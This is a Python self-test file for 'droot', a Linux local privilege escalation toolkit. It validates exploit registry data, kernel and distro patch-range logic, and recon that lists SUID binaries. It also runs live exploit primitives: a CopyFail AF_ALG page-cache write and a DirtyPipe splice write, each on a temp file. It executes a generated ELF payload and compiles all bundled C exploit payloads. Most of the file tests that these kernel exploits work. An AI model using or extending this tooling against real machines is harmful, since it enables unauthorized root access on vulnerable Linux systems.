"""
droot self-test: verifies the toolkit end-to-end on the local box without
touching any system file. Run: python3 -m droot.selftest  (or `droot selftest`)

Checks:
  1. imports + registry integrity (unique ids/CVEs, payload files present)
  2. kernel version parsing + range logic + distro fixed-in logic
  3. synthetic verdicts (patched vs vulnerable across distro schemes)
  4. recon profile gathering
  5. runner canary plumbing (marker uid check, both branches)
  6. native module checks (pwnkit/userspace) against the live profile
  7. CopyFail AF_ALG primitive on a throwaway temp file (skips cleanly when
     the kernel is patched or AF_ALG is absent)
  8. the hand-built CopyFail ELF payload actually executes
  9. DirtyPipe splice primitive on a throwaway temp file
 10. every vendored C payload compiles on this box

droot -- Linux LPE toolkit. Author: baba01hacker.
"""
from __future__ import annotations

import os
import subprocess
import sys
import tempfile
import types

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from droot import registry                      # noqa: E402
from droot.exploits import base, copyfail, dirtypipe  # noqa: E402
from droot.exploits import csource              # noqa: E402
from droot.kernelver import KernelVersion, detect_distro, in_range, is_fixed_by_distro  # noqa: E402
from droot.recon import gather_profile          # noqa: E402
from droot.runner import Runner                 # noqa: E402

V = KernelVersion.parse
RESULTS = []


def check(name, fn):
    try:
        ok, detail = fn()
    except Exception as e:
        ok, detail = False, "exception: %s" % e
    RESULTS.append((name, bool(ok), str(detail)[:200]))


# ---------------------------------------------------------------------------

def t_imports():
    import droot.cli  # noqa: F401
    import droot.runner  # noqa: F401
    return True, "all modules import"


def t_registry_integrity():
    ids, cves = [], []
    missing = []
    pkg_dir = os.path.dirname(os.path.abspath(__file__))
    for s in registry.REGISTRY:
        if s.id in ids:
            return False, "duplicate id %s" % s.id
        ids.append(s.id)
        if s.cve:
            cves.append(s.cve)
        if s.kind != "native" and s.payload:
            p = os.path.join(pkg_dir, "payloads", s.payload)
            if not os.path.exists(p):
                missing.append(s.payload)
        for lo, hi in s.kernel_ranges:
            if lo is not None and hi is not None and lo >= hi:
                return False, "%s: bad range %s-%s" % (s.id, lo, hi)
    if missing:
        return False, "missing payloads: %s" % missing
    return True, "%d exploits, %d with CVEs" % (len(ids), len(cves))


def t_version_logic():
    assert V("5.15.0-124-generic").key == (5, 15, 0)
    assert V("4.8.3") < V("5.8")
    assert in_range(V("5.15.0-100"), V("5.8"), V("5.16.11"))
    assert not in_range(V("5.16.11"), V("5.8"), V("5.16.11"))
    dr = detect_distro("5.15.0-124-generic")
    assert dr.abi == 124
    # synthetic debian-family release with distro fixes
    d = types.SimpleNamespace(
        kernel=V("5.15.0"), abi=24, rpm_release=None, family="debian",
        kernel_release="5.15.0-24-generic")
    assert is_fixed_by_distro({"debian": [("5.15.0", 25)]}, d) is False
    d.abi = 25
    assert is_fixed_by_distro({"debian": [("5.15.0", 25)]}, d) is True
    # rpm family
    r = types.SimpleNamespace(
        kernel=V("5.14.0"), abi=None, rpm_release="427.13.1.el9_4",
        family="rpm", kernel_release="5.14.0-427.13.1.el9_4.x86_64")
    assert is_fixed_by_distro({"rpm": ["427.20.1.el9_4"]}, r) is False
    r.rpm_release = "427.20.1.el9_4"
    assert is_fixed_by_distro({"rpm": ["427.20.1.el9_4"]}, r) is True
    return True, "parse/range/abi/rpm fixed-in all correct"


def t_synthetic_verdicts():
    class FakeProfile:
        """Minimal profile carrying just what evaluate() touches."""
        def __init__(self, distro, af_alg=False, authencesn=False):
            self.distro = distro
            self.af_alg = af_alg
            self.authencesn = authencesn
    # ubuntu 5.15.0-24 -> dirtypipe vulnerable; -25 -> patched
    dr = detect_distro("5.15.0-24-generic")
    dr.id, dr.version, dr.family = "ubuntu", "22.04", "debian"
    v1 = registry.evaluate(registry.by_id("dirtypipe"),
                           FakeProfile(dr))
    dr2 = detect_distro("5.15.0-25-generic")
    dr2.id, dr2.version, dr2.family = "ubuntu", "22.04", "debian"
    v2 = registry.evaluate(registry.by_id("dirtypipe"),
                           FakeProfile(dr2))
    if v1.status != "VULNERABLE":
        return False, "dirtypipe on 5.15.0-24 should be VULNERABLE, got %s" % v1.status
    if v2.status != "PATCHED":
        return False, "dirtypipe on 5.15.0-25 should be PATCHED, got %s" % v2.status
    # copyfail range check: 6.12.0-30 -> VULNERABLE (needs af_alg)
    dr3 = detect_distro("6.12.0-30-generic")
    dr3.id, dr3.version, dr3.family = "ubuntu", "24.04", "debian"
    v3 = registry.evaluate(registry.by_id("copyfail"),
                           FakeProfile(dr3, af_alg=True, authencesn=True))
    if v3.status != "VULNERABLE":
        return False, "copyfail on ubuntu 6.12.0-30 should be VULNERABLE, got %s" % v3.status
    # copyfail without AF_ALG -> UNAVAILABLE
    v4 = registry.evaluate(registry.by_id("copyfail"), FakeProfile(dr3))
    if v4.status != "UNAVAILABLE":
        return False, "copyfail without AF_ALG should be UNAVAILABLE, got %s" % v4.status
    # copyfail on 6.19.14 (fixed upstream) -> PATCHED
    dr5 = detect_distro("6.19.14-generic")
    dr5.id, dr5.version, dr5.family = "ubuntu", "26.04", "debian"
    v5 = registry.evaluate(registry.by_id("copyfail"),
                           FakeProfile(dr5, af_alg=True, authencesn=True))
    if v5.status != "PATCHED":
        return False, "copyfail on 6.19.14 should be PATCHED, got %s" % v5.status
    return True, "dirtypipe/copyfail verdicts correct across distro fixes"


def t_recon():
    p = gather_profile()
    assert p.distro is not None and p.uid >= 0
    assert isinstance(p.suid_binaries, list)
    return True, "profile gathered (%s, %d suid binaries)" % (
        p.distro.kernel_release, len(p.suid_binaries))


def t_canary_plumbing():
    r = Runner()
    ctx = r.context(timeout=30)
    # 1) missing marker -> not verified
    if base.NativeExploit.root_verified(ctx):
        return False, "root_verified() true with no marker"
    # 2) marker owned by our uid -> still not verified
    with open(ctx.marker, "w") as f:
        f.write("1001\n")
    if base.NativeExploit.root_verified(ctx):
        return False, "root_verified() true for non-root marker"
    # 3) stubbed uid-0 marker -> verified
    real_stat = base.os_stat
    try:
        base.os_stat = lambda p: types.SimpleNamespace(st_uid=0)
        if not base.NativeExploit.root_verified(ctx):
            return False, "root_verified() false for root-owned marker"
    finally:
        base.os_stat = real_stat
    os.unlink(ctx.marker)
    # 4) a fake 'exploit' that runs the canary leaves a non-root marker
    script = os.path.join(ctx.workdir, "fake_exploit.sh")
    with open(script, "w") as f:
        f.write("#!/bin/sh\ncat > /dev/null\nid -u > %s\n" % ctx.marker)
    os.chmod(script, 0o755)
    subprocess.run([script], input=ctx.canary(), capture_output=True,
                   text=True, timeout=30)
    ok = os.path.exists(ctx.marker) and not base.NativeExploit.root_verified(ctx)
    return ok, "canary verification logic correct (all 3 branches)"


def t_native_checks():
    from droot.exploits import pwnkit, userspace
    profile = gather_profile()
    pv = pwnkit.PwnKit().check(profile)
    if pv is None:
        return False, "pwnkit check returned None"
    expected = "PATCHED" if (profile.pkexec_version or 0) >= 0.120 else "VULNERABLE"
    if pv.status != expected:
        return False, "pwnkit verdict %s (expected %s)" % (pv.status, expected)
    uv = userspace.Userspace().check(profile)
    return True, "pwnkit=%s userspace=%s" % (pv.status, uv.status if uv else "?")


def t_copyfail_primitive():
    if not gather_profile_afalg():
        return True, "SKIP: AF_ALG/authencesn unavailable on this box"
    path = "/tmp/.droot_selftest_afalg"
    with open(path, "wb") as f:
        f.write(b"\x00" * 128)
    try:
        fd = os.open(path, os.O_RDONLY)
        try:
            copyfail.patch4(fd, 0, b"AAA!")
            copyfail.patch4(fd, 40, b"BBQ?")
        finally:
            os.close(fd)
        with open(path, "rb") as f:
            data = f.read()
    finally:
        try:
            os.unlink(path)
        except OSError:
            pass
    if data[0:4] == b"AAA!" and data[40:44] == b"BBQ?":
        return True, "AF_ALG 4-byte page-cache write CONFIRMED on this kernel"
    return False, "primitive did not land (kernel patched?) data=%s" % data[0:8].hex()


_AFALG_CACHE = None


def gather_profile_afalg():
    global _AFALG_CACHE
    if _AFALG_CACHE is None:
        _AFALG_CACHE = gather_profile()
    return _AFALG_CACHE.af_alg and _AFALG_CACHE.authencesn


def t_copyfail_elf():
    payload = copyfail.build_elf_payload("/tmp/.droot_selftest_marker",
                                         "/tmp/.droot_selftest_rs")
    if not payload.startswith(b"\x7fELF"):
        return False, "bad ELF magic"
    path = os.path.join(tempfile.mkdtemp(prefix="droot-"), "payload.elf")
    with open(path, "wb") as f:
        f.write(payload)
    os.chmod(path, 0o755)
    marker = "/tmp/.droot_selftest_marker"
    for p in (marker, "/tmp/.droot_selftest_rs"):
        try:
            os.unlink(p)
        except OSError:
            pass
    rc = subprocess.run([path], input="", capture_output=True, timeout=10)
    ran = os.path.exists(marker)
    try:
        os.unlink(path)
        os.unlink(marker)
        os.unlink("/tmp/.droot_selftest_rs")
    except OSError:
        pass
    return (rc.returncode == 0 and ran,
            "%d-byte ELF executes and writes marker (rc=%d)" % (len(payload),
                                                                rc.returncode))


def t_dirtypipe_primitive():
    path = "/tmp/.droot_selftest_dp"
    original = b"root:x:0:0:root:/root:/bin/bash\n"
    with open(path, "wb") as f:
        f.write(original)
    try:
        changed = dirtypipe.DirtyPipe.patch_temp_file(path)
    finally:
        try:
            os.unlink(path)
        except OSError:
            pass
    if changed:
        return True, "splice page-cache write CONFIRMED on this kernel"
    return True, "primitive inert on this kernel (patched against CVE-2022-0847)"


def t_compile_all():
    ok, fail, skipped = [], [], []
    for spec in registry.REGISTRY:
        if spec.kind != "csource":
            continue
        binary, err = csource.build(spec, os.path.expanduser("~/.droot/cache"))
        if binary:
            ok.append(spec.id)
        elif err.startswith("payload missing") or "musl-gcc" in err:
            skipped.append("%s (%s)" % (spec.id, err[:40]))
        else:
            fail.append("%s: %s" % (spec.id, err[:80]))
    detail = "built %d, skipped %d" % (len(ok), len(skipped))
    if skipped:
        detail += " [%s]" % "; ".join(skipped)
    if fail:
        detail += " | FAILED: " + "; ".join(fail[:4])
    return (len(fail) == 0, detail)


def main():
    check("imports", t_imports)
    check("registry integrity", t_registry_integrity)
    check("version logic", t_version_logic)
    check("synthetic verdicts", t_synthetic_verdicts)
    check("recon profile", t_recon)
    check("canary plumbing", t_canary_plumbing)
    check("native module checks", t_native_checks)
    check("copyfail AF_ALG primitive", t_copyfail_primitive)
    check("copyfail ELF payload", t_copyfail_elf)
    check("dirtypipe splice primitive", t_dirtypipe_primitive)
    check("compile all C payloads", t_compile_all)

    print()
    print("droot selftest")
    print("=" * 60)
    for name, ok, detail in RESULTS:
        mark = "PASS" if ok else "FAIL"
        print("[%s] %-28s %s" % (mark, name, detail))
    print("=" * 60)
    failed = [r for r in RESULTS if not r[1]]
    print("%d/%d passed" % (len(RESULTS) - len(failed), len(RESULTS)))
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
